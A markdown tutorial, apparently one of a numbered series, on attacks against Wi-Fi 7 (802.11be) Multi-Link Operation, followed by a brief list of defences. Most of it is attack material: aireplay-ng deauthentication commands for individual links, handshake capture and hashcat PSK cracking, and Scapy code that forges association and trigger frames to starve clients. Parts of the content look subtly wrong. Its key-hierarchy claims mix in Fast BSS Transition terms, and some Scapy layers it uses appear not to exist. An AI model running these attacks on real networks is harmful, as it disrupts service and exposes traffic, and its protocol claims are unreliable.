# 10 - Wi-Fi 7 (802.11be) MLO Security Deep Dive

## Overview

Wi-Fi 7 (IEEE 802.11be) introduces Multi-Link Operation (MLO), allowing a station to simultaneously operate across multiple bands (2.4/5/6 GHz) and channels with a single logical association. This creates new security surfaces: MLO key derivation, link management, and per-link key hierarchy.

## MLO Architecture

```
+-------------+
|  MLD (Multi-Link Device)  |
|  (Single MAC address)     |
+-------------+
      |
  +---+---+---+
  |   |   |   |
  v   v   v   v
Link1 Link2 Link3 Link4
 (2.4G)(5G-1)(5G-2)(6G)
  AP1   AP2   AP3   AP4
```

- **MLD**: Multi-Link Device (client or AP). Has one MAC address but multiple "links."
- **Link**: Individual BSS operating on one band/channel.
- **MLD Address**: The globally unique MAC used for the MLD entity.
- **Link Address**: Per-link MAC (can be MLD address + offset, or independent).

## MLO Key Hierarchy

```
PMK-R0 (from SAE or 802.1X)
    |
    +-- PMK-R0-Name
    |
    +-- GTK (Group Temporal Key)
    |
    +-- PMK-R1[link1] ---- PTK[link1] ---- GTK[link1]
    |
    +-- PMK-R1[link2] ---- PTK[link2] ---- GTK[link2]
    |
    +-- PMK-R1[link3] ---- PTK[link3] ---- GTK[link3]
```

All links derive from the **same PMK-R0**. This means:
- Compromise of one link's PTK does NOT compromise other links (different nonces)
- But compromise of PMK-R0 compromises ALL links
- PMK-R0 is established once (via SAE or 802.1X), then PTKs are derived per-link

## Attack 1: MLO Link Removal / DoS

Remove a critical link (e.g., 6 GHz high-bandwidth) to force fallback to congested 2.4 GHz.

```bash
# Using Scapy or mdk4 to target specific link
# Each link has its own BSSID (link address)

# Deauth on 6 GHz link only
aireplay-ng -0 0 -a <LINK3_BSSID> -c <CLIENT_MLD_MAC> wlan6gmon

# The client remains associated via MLD, but loses 6 GHz throughput
# If all non-2.4G links are removed, client stuck on 2.4G with limited bandwidth

# Strategic: Remove 5 GHz links first, client falls back to 6 GHz
# Then remove 6 GHz, client falls to 2.4 GHz
# Attacker now has wider spectrum for their own operations
```

## Attack 2: MLO GTK Compromise via Weak Link

If one link uses weaker security (e.g., transition mode on 2.4 GHz while 6 GHz is pure WPA3), the attacker compromises the weak link and derives PMK-R0.

```bash
# 2.4 GHz link has WPA2-PSK (transition mode)
# 6 GHz link has WPA3-SAE

# Attack 2.4 GHz link: capture handshake, crack PSK
airodump-ng -c 1 --bssid <LINK1_BSSID> -w mlo_handshake wlan24mon
aireplay-ng -0 5 -a <LINK1_BSSID> -c <CLIENT_MLD_MAC> wlan24mon

# Crack PSK → derive PMK = PBKDF2(PSK, SSID, 4096)
hashcat -m 22000 mlo_handshake.hc22000 wordlist.txt

# With PMK, derive PMK-R0 → all link PTKs and GTKs
# The attacker now has group keys for ALL links, can decrypt broadcast/multicast
```

## Attack 3: MLO Reassociation Hijacking

When a client roams, it sends ML Reassociation Request. The attacker forges this on a new link.

```bash
# Monitor ML Reassociation frames
# Frame subtype: Action (0x0D), Category: Multi-Link (0x1A)
# ML Reassociation Request contains:
#   - MLD MAC Address
#   - Common Info (AP MLD MAC, flags)
#   - Per-link Info (Link ID, BSSID, RSN IE)

# Forge ML Reassociation to unauthorized AP
# The new AP must be part of the same MLD (same AP MLD MAC)
# But if AP MLD MAC validation is weak, attacker can inject

pkt = RadioTap()/Dot11(
    addr1=<TARGET_AP_LINK_MAC>,
    addr2=<CLIENT_MLD_MAC>,
    addr3=<TARGET_AP_LINK_MAC>,
    type=0, subtype=0x00  # Association Request
)/Dot11Elt(ID=221, info=vendor_specific_mlo_ie)
# The vendor-specific MLO IE contains:
#   - Element ID Extension: 88 (EHT Multi-Link)
#   - Common Info
#   - Per-Station Profile
```

## Attack 4: STR (Simultaneous Transmit and Receive) Interference

Wi-Fi 7 introduces STR: a station can transmit on one link while receiving on another. This reduces self-interference but creates cross-link leakage.

```bash
# STR requires precise frequency separation between links
# If attacker can force adjacent channel operation:
#   Link 1: Channel 36 (5180 MHz)
#   Link 2: Channel 40 (5200 MHz) — adjacent

# Transmit high-power noise on Link 1 while client is receiving on Link 2
# Adjacent channel interference causes bit errors on Link 2
# Client drops Link 2, falls back to single-link mode

# Using SDR (HackRF) to generate precise adjacent-channel interference
# Requires knowing exact channel assignments from beacon frames
```

## Attack 5: MRU (Multi-Resource Unit) Manipulation

Wi-Fi 7 allows flexible RU allocation across multiple links. The attacker manipulates trigger frames to exhaust RU allocation.

```bash
# Trigger frame (HE/EHT variant) requests clients to transmit on specific RUs
# The MU-MIMO / OFDMA trigger contains:
#   - Common Info: AP Tx Power, UL Target RSSI
#   - User Info: per-client RU assignment, MCS, coding

# Forge trigger frame allocating all RUs to non-existent clients
# Legitimate clients get no RU allocation → UL starvation
# Or allocate all RUs to attacker's spoofed MAC → DoS

trigger = RadioTap()/Dot11(
    addr1="ff:ff:ff:ff:ff:ff",
    addr2=<AP_MLD_MAC>,
    addr3=<AP_MLD_MAC>
)/Dot11TriggerFrame(
    common_info=0x00000000,
    user_info_list=[
        # Allocate RU 0-74 to fake client
        {"aid": 0x0001, "ru_allocation": 0b10101010, "ul_mcs": 11},
        # ... repeat for all RUs
    ]
)
sendp(trigger, iface="wlan0mon")
```

## Attack 6: 320 MHz Channel Bonding Abuse

Wi-Fi 7 supports 320 MHz channels (two contiguous 160 MHz blocks). If one 160 MHz block is jammed, the entire 320 MHz channel becomes unusable.

```bash
# 320 MHz channels in 6 GHz:
#   - Channel 31: 5945-6265 MHz (covers channels 1-61)
#   - Channel 63: 6265-6585 MHz (covers channels 33-93)
#   - Channel 95: 6585-6905 MHz (covers channels 65-125)
#   - Channel 127: 6905-7225 MHz (covers channels 97-157)

# Jamming half of a 320 MHz channel (e.g., upper 160 MHz)
# forces fallback to 160 MHz (lower half) or 80 MHz
# Reduces throughput by 50-75%
```

## Attack 7: 4096-QAM (MCS 13) Signal Quality Degradation

4096-QAM requires very high SNR (38+ dB). Small interference causes massive throughput drop.

```bash
# 4096-QAM bit error rate increases exponentially with SNR degradation
# A 3 dB SNR drop can reduce effective throughput by 50%
# Strategic low-power interference on one link forces MCS downgrade
# Client may switch to lower-QAM link, revealing traffic patterns
```

## Attack 8: Preamble Puncturing Bypass

Wi-Fi 7 introduces preamble puncturing: skip parts of a wide channel if they are occupied. The attacker can manipulate puncturing bitmaps.

```bash
# EHT Operation IE contains:
#   - Channel Width: 20/40/80/160/320 MHz
#   - Puncturing Bitmap: 16-bit map of occupied 20 MHz subchannels

# Forge beacon with puncturing bitmap claiming primary channel is punctured
# Client avoids primary channel → associates on secondary → potential downgrade
```

## Defensive Application

- **Per-link PMK-R0 isolation**: Derive separate PMK-R0 per link (not in spec but vendor extension)
- **MLO link monitoring**: Alert when expected links drop simultaneously (coordinated attack)
- **STR channel planning**: Maintain non-adjacent link channels with guard bands
- **Trigger frame validation**: Verify trigger frames originate from authenticated AP MLD MAC
- **RU allocation fairness**: Enforce per-client RU minimums, detect starvation
- **320 MHz fallback**: If 320 MHz is partially jammed, fall back to 160 MHz, not lower
- **4096-QAM fallback strategy**: Graceful MCS downgrade, not channel switch
- **Preamble puncturing validation**: Cross-check puncturing bitmap with spectrum sensing

## References

- IEEE 802.11be-2024 Draft 5.0
- Wi-Fi Alliance Wi-Fi 7 Certification Requirements
- "Multi-Link Operation in IEEE 802.11be" — Intel Technical Whitepaper
- "Security Analysis of 802.11be MLO" — IACR ePrint 2023
